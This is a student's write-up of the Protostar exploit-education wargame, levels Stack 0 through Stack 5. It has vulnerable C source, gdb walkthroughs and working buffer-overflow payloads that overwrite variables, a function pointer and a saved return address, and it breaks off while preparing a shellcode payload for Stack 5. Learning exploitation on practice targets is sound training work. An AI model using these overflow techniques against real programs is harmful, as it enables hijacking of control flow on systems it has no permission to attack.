# Protostar Exploits Writeups.

[Link](https://exploit.education/protostar/)


After setting up the Protostate we can connect to it using the ssh on our localhost and can go into the /bin/sh shell.
![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/7c4443a6-6d96-4910-ad98-ae14744bd6ec)

> Username: user
> 
> Password: user


## Stack 0

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

So in this program we have to basically modify the value to the variable "modified" and run the code so that the part to code that is not desirable to run can be run.

we know that the gets function is a buggy function we can also check into the man page.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/b09a466e-8aeb-401a-b8cc-ce6f72bb32b0)

using the gets function we can overwrite the stack as we cannot control the input size of the gets function it continues to take the input.

lets check into the disassebly code and check for the stack.
opening the program in GDB and disassemblying the main function.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/132f6a48-4850-4114-adbe-100440e9c3a3)

setting the break pointer and runneing the code with sample input and cheking for the registers value we can clearly see that the buffer value starts from the 0xbffff76b to 0xbffff7ab and the next 4 bytes that are for the modified variable are kept to 0 also we can see that it follows little endian format.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/945028f6-d348-4d4a-a609-2341ea2ee30d)

so basically we have to write a byte array that is larger than ```0xbffff7ab - 0xbffff76b = 64``` to over flow into the next variable.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/60904dff-8466-4db6-9ba9-fcc8964a9c4d)

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/11d9aa2d-08a1-49ab-b08f-6aa1d4fcb855)

and are we are done.

we can also use the following script to do so.


```sh
python -c "print('A'*65)" | ./stack0
```

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/f25cbdd7-cbc2-4e9b-b7b8-7fe698380bbe)



## Stack 1

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/ab8c5ba8-f209-480a-a268-7453baaf19c5)

Source Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

This program is bit similar to previous one but this time we have to change to value to modified variable to something particualar given to us. ```0x61626364``` also the busffer variable is set with teh strcpy function which functions as similar in buffer overflow.
applying the previous trick to get the buffer over flow in modified variable. the size of buffer is of 64 bytes and next 4 bytes for the buffer overflow into modified variable.


opening it in gdb and imputing the overflow array.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/6df0d495-d1ac-47d3-98f5-6f71e01e417e)

here we successfully changed the value of the modified variable to the required value.

we can also use following code snippit to do it

```sh
./stack1 $(python -c "print('A'*64+'\x64\x63\x62\x61')")
```

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/1546931c-e777-4035-8358-ea48970ff069)



## Stack 2

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/a2a8cd1f-ce27-40be-89c9-f39aadf0045b)

Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
in this we have to define a path variable to take the input from and thus resulting into the overflow of the buffer variable.
this is similar to the previous stack challenge just we have to inject using the environment variable.

we can use the following script to do so.

```sh
GREENIE=$(python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'") ./stack2
```

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/dde77294-1d9e-4996-9f27-6e42bf3791a7)


## Stack 3

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/3c58b8bc-eec7-4f0f-8701-2978eb1c3ede)

Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Now by using the same concept of buffer overflow we have to call the function win that is just defined in our code but is not called.
to do so we have to overlook for the stack and how is the function is called using the stacks.

so basically there is a function pointer fp which is simply checks that if fp is not zero it calls the function pointer.
so we have to overflow the address of win function in the fp variable.
every function has a memory address in memory so it will call whatever address is stored in the fp.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/c2ea3ca1-000b-4997-a912-1b376b800a11)

opening into the gdb we get the address of the win function.
as of the previous stacks challs the fp variable is checked with the value 0 and then if the fp variable is not 0 then the address is loaded into the eax and is called at whatever address it points to.

lets add a break point on the call and enter a big value so that the value of fp pointer is changed.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/a11e9dad-dd0e-4979-b260-784eada4ab7c)

we can see that the eax value is set to 0x41 that is the ascii value of capital A but we wanted to value to be the address of the the win function that is ```0x08048424```

so lets create a python file to get the input 

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/d73751f3-a764-4350-b20c-38517ef006dd)

```py

buffer='A'*64

target="\x24\x84\x04\x08"

print(buffer+target)

```

and pipe that output to a file so that we can use it repetedly.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/efb6303b-5268-4772-bff1-36f027f31338)

now we can use this inp file to get the input directly after running the file and checking for the registers we get out desired value and we are done.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/0f717810-fcb9-4f01-9991-8d05284f904b)

## Stack 4

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/4febdb07-9754-40fd-9f20-c3f2d2274a4e)

Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

so now in this wehave to run the win function with not actually having any function call and not a single variable do so,

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/3e86551f-660a-4699-937d-3057a9ee2fea)

so here we have to understand to concept of stack that whenever the finction is called the return address of the is placed on the stack i.e. the address where we have to continue after when the function returns, so now we can overflow into the return pointer so that we can get to the win function.

so lets to to get a long buffer overflow and try load the function in gdb.

```py

buffer='AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'


target=""

print(buffer+target)

```
so checking for the registers we got a segmentation falut at the eip to address ```0x54545454``` which is ASCII T so basically we have to change the input a little bit to replace the TTTT with the required address of the win function. here we can also see that the address of ebp variable is also changed. thus is not of much use of as as of now.


![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/cc85c70e-3804-450d-8c79-08c52f5d1b71)


```py
buffer='AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'


target="\xf4\x83\x04\x08" #0x080483f4

print(buffer+target)

```

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/7e573807-7329-41c3-91f6-70f942409411)

we successfully change the conrol flow.


## Stack 5

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/2d1d2604-ea95-4a2e-bc64-2b12b9179a90)

Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Here we have to do something to inject the shell code and get the shell into it.

here the code looks very simpler, it just have a input using gets which we can use to overwrite the stack.

lets first input a large string so that it overflows into the stack and we can know where we have actually to put our code.

stack.py
```py
buffer='AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
print(buffer)
```




![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/3be92aba-2e64-48bf-8158-44fb4a942458)

here we recieved a segmentation falult as we have to jump to the address 0x54545454 which is nothing aur mat be not defined.
so now we have to replace ```0x54545454``` with some another address. also we have to execute the  ```\xcc``` [INT 3](https://int3.io/) which actually interrups the program to further continue or just stops it. 
firstly check for tne address where we have actually to get.

![image](https://github.com/nikunjagarwal17/CSOC-IITBHU/assets/144536875/0954e2eb-c77f-482a-ae7c-b16911bb8af8)

so the address we wanted to go is ```0xbffff7c0``` so lets modify our payload accordingly 


so lets just change our payload to get the following.















































